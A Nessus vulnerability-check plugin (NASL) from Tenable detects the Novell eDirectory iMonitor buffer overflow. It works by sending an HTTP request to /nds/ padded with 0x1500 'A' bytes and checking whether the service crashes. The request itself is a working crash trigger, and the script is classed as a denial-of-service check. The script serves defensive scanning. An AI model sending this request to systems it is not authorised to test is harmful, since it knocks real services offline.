#
# (C) Tenable Network Security
#

if(description)
{
 script_id(19428);
 script_cve_id("CVE-2005-2551", "CVE-2006-2496");
 script_bugtraq_id(14548, 18026);
 script_xref(name:"OSVDB", value:"25781");
 script_version("$Revision: 1.5 $");
 name["english"] = "Novell eDirectory Server iMonitor Buffer Overflow Vulnerability";
 script_name(english:name["english"]);
 
 desc["english"] = "
Synopsis :

The remote web server is affected by a buffer overflow vulnerability. 

Description :

The remote host is running a version of eDirectory iMonitor which is
vulnerable to a remote buffer overflow.  An attacker may exploit this
flaw to execute arbitrary code on the remote host or to disable this
service remotely. 

To exploit this flaw, an attacker would need to send a specially
crafted packet to the remote service. 

Solution : 

http://support.novell.com/cgi-bin/search/searchtid.cgi?/10098568.htm
http://www.zerodayinitiative.com/advisories/ZDI-06-016.html
http://support.novell.com/cgi-bin/search/searchtid.cgi?/2973759.htm

Risk factor : 

Critical / CVSS Base Score : 10 
(AV:R/AC:L/Au:NR/C:C/A:C/I:C/B:N)";


 script_description(english:desc["english"]);
 
 summary["english"] = "Checks for a buffer overflow in eDirectory iMonitor";
 
 script_summary(english:summary["english"]);
 
 script_category(ACT_DENIAL);
 
 script_copyright(english:"This script is Copyright (C) 2005 Tenable Network Security");
 family["english"] = "Gain root remotely";
 script_family(english:family["english"]);
 script_dependencie("http_version.nasl");
 script_require_ports("Services/www", 8008, 8010, 8028, 8030);
 exit(0);
}

# Check starts here

include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:8008);
if(!get_port_state(port))exit(0);
banner = get_http_banner (port:port);
if (egrep(pattern:"Server: .*HttpStk/[0-9]+\.[0-9]+", string:banner))
{

 if (http_is_dead(port:port))
   exit(0);

 req = http_get(item:"/nds/" + crap(data:"A", length:0x1500), port:port);
 res = http_keepalive_send_recv(port:port, data:req);

 if (http_is_dead(port:port))
   security_hole(port);
}
